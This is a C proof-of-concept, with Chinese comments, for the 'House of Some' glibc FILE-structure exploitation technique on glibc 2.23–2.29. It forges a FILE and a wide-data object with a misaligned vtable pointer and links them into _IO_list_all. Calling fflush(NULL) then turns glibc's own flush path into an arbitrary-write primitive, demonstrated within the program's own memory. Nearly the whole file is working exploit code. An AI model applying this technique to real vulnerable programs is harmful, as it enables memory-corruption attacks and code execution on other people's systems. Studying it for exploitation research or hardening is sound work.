#define _GNU_SOURCE

#include <assert.h>
#include <dlfcn.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

/*
 * House of Some 消费端：glibc 2.23～2.29 / x86-64。
 *
 * legacy `_IO_wide_data` 内含旧 codecvt 表，`_wide_vtable` 在 +0x130。
 * 本 PoC 从 _IO_list_all/fflush(NULL) 真实触发，不直接调用 underflow：
 *
 *   _IO_wfile_overflow -> _IO_wdoallocbuf
 *   -> 通过错位虚表 (_IO_file_jumps - 0x48) 调用 doallocate，
 *   -> 最终进入 _IO_new_file_underflow，并执行 read(fd, target, len)。
 */

#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static const char supplied[] = "HOUSE-OF-SOME:LEGACY";
    unsigned char target[sizeof(supplied)];
    unsigned char lock_storage[64];
    unsigned char wide[0x150] __attribute__((aligned(0x10)));
    struct fake_file_plus fake;
    void **list_slot;
    void *saved_list;
    const unsigned char *file_jumps;
    const void *wfile_jumps;
    int fds[2];

    assert(sizeof(FILE) == 0xd8);
    memset(target, 0, sizeof(target));
    memset(lock_storage, 0, sizeof(lock_storage));
    memset(wide, 0, sizeof(wide));
    memset(&fake, 0, sizeof(fake));

    list_slot = (void **)dlsym(RTLD_DEFAULT, "_IO_list_all");
    file_jumps =
        (const unsigned char *)dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    wfile_jumps = dlsym(RTLD_DEFAULT, "_IO_wfile_jumps");
    assert(list_slot != NULL && file_jumps != NULL && wfile_jumps != NULL);
    saved_list = *list_slot;

    assert(pipe(fds) == 0);
    assert(write(fds[1], supplied, sizeof(supplied)) ==
           (ssize_t)sizeof(supplied));
    close(fds[1]);

    fake.file._flags = IO_LINKED;
    fake.file._chain = NULL;            /* 实战用它串下一个 read/write FILE。 */
    fake.file._fileno = fds[0];
    fake.file._lock = lock_storage;
    fake.file._mode = 2;                /* 选择 _IO_flush_all 的 wide 分支。 */
    /* 把 FILE 的 _wide_data 字段指向伪造宽字符对象。 */
    *(void **)((unsigned char *)&fake.file + 0xa0) = wide;

    /* 让最终的 _IO_file_read 把 pipe 内容写入 target。 */
    fake.file._IO_read_base = (char *)target;
    fake.file._IO_read_ptr = (char *)target;
    fake.file._IO_read_end = (char *)target;
    fake.file._IO_write_base = (char *)target;
    fake.file._IO_write_ptr = (char *)target;
    fake.file._IO_write_end = (char *)target + sizeof(target);
    fake.file._IO_buf_base = (char *)target;
    fake.file._IO_buf_end = (char *)target + sizeof(target);
    fake.vtable = wfile_jumps;           /* 合法 primary wide vtable。 */

    /*
     * +0x18/+0x20 令 wide write_ptr > wide write_base，触发 flush；
     * +0x30 为 NULL，令 wdoallocbuf 调用 wide doallocate；
     * legacy `_wide_vtable` 位于 +0x130。
     */
    *(void **)(wide + 0x18) = NULL;
    *(void **)(wide + 0x20) = (void *)1;
    *(void **)(wide + 0x30) = NULL;
    *(void **)(wide + 0x130) = (void *)(file_jumps - 0x48);

    *list_slot = &fake;
    (void)fflush(NULL);
    *list_slot = saved_list;
    close(fds[0]);

    assert(memcmp(target, supplied, sizeof(supplied)) == 0);
    dprintf(STDERR_FILENO,
            "[+] House of Some legacy +0x130 任意写成功（%zu 字节）\n",
            sizeof(supplied));
    return 0;
}
